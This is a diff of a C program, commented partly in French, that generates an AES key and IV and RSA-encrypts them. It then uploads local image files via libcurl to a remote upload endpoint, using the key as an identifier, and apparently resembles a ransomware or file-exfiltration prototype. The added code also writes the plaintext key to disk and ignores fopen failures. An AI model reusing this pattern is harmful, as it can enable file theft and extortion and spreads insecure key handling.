@@ -20,6 +20,8 @@
 #include "encryption.h"
 
 void sendFileToApi(const char *path, const char *id, const char *api);
+char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size);
+void write_to_file(char *filename, char *value, int size);
 
 
 
@@ -37,6 +39,15 @@ int main(){
     size_t iv_size = sizeof(iv);
     RAND_bytes(iv, iv_size);
 
+    char *key_lisible;
+    char *iv_lisible;
+
+    key_lisible = debug_bytes(key, key_size);
+    iv_lisible = debug_bytes(iv, iv_size);
+
+    write_to_file("aes_key.txt", key_lisible, 64);
+    write_to_file("iv.txt", iv_lisible, 32);
+
     //Authentication string
     static const unsigned char aad[] = "Cyan";
 
@@ -52,26 +63,6 @@ int main(){
     const unsigned char* encrypted_aes_key = encrypt_RSA(public_key_pem, key, key_size);
     const unsigned char* encrypted_iv = encrypt_RSA(public_key_pem, iv, iv_size);
 
-    size_t aes_size = sizeof(encrypted_aes_key);
-    
-    char hex_string[aes_size / 8 * 2 + 1]; 
-    char hex_iv[iv_size / 8 * 2 + 1];       
-
-    // Convert octect in hexa and stock it
-    for (int i = 0; i < aes_size / 8; ++i) {
-        sprintf(hex_string + i * 2, "%02x", encrypted_aes_key[i]);
-    }
-    hex_string[aes_size / 8 * 2] = '\0';
-
-    for (int i = 0; i < iv_size / 8; ++i) {
-        sprintf(hex_iv + i * 2, "%02x", encrypted_iv[i]);
-    }
-    hex_iv[iv_size / 8 * 2] = '\0';
-
-    save_hex_to_file("iv.txt", (unsigned char *)hex_iv, strlen(hex_iv)); 
-    printf("IV: %s\n", hex_iv);
-    printf("aes: %s\n", hex_string);
-
     OPENSSL_free(encrypted_aes_key);
     OPENSSL_free(encrypted_iv);
 
@@ -80,8 +71,7 @@ int main(){
     int port = 42956;
     const char *URL[100];
     sprintf(URL, "http://%s:%d/upload", ip, port);
-    printf("url: %s", &URL);
-    const unsigned char *ID = hex_string;
+    const unsigned char *ID = key_lisible;
 
     sendFileToApi("1v1.jpg", ID, URL);
     sendFileToApi("1v1 copy.jpg", ID, URL);
@@ -111,7 +101,7 @@ int main(){
 
     return 0;
 }
-//WIP
+
 void sendFileToApi(const char *path, const char *id, const char *api){
     /*Documentation: https://curl.se/libcurl/c/fileupload.html */
     CURL *curl;
@@ -154,14 +144,29 @@ void sendFileToApi(const char *path, const char *id, const char *api){
 
 }
 
-void save_hex_to_file(const char *filename, const unsigned char *data, size_t data_len) {
-    FILE *file = fopen(filename, "w");
-    if (file) {
-        fwrite(data, sizeof(unsigned char), data_len, file);
-        fclose(file);
-    } else {
-        fprintf(stderr, "Failed to open file %s for writing\n", filename);
+char* debug_bytes(const unsigned char* byte_sequence, size_t sequence_size){
+    char* lisible = (char*)malloc(sequence_size * 2 + 1); // +1 pour le caractère de fin de chaîne
+    if (lisible == NULL) {
+        fprintf(stderr, "Memory allocation failed.\n");
+        exit(EXIT_FAILURE);
     }
+    size_t j = 0;
+    for (size_t i = 0; i < sequence_size; ++i) {
+        j += sprintf(&lisible[j], "%02x", byte_sequence[i]);
+    }
+    printf("KEY / IV : %s\n", lisible); // Affiche la représentation hexadécimale
+    return lisible;
 }
 
+void write_to_file(char *filename, char *value, int size){
+    FILE *file_pointer;
+    file_pointer = fopen(filename, "w"); // Ouvre le fichier en mode écriture
 
+    if (file_pointer == NULL) {
+        printf("Error: cannot open the file.\n");
+    }
+
+    fwrite(value, sizeof(char), size, file_pointer); // Écrit la clé dans le fichier
+
+    fclose(file_pointer); // Ferme le fichier
+}
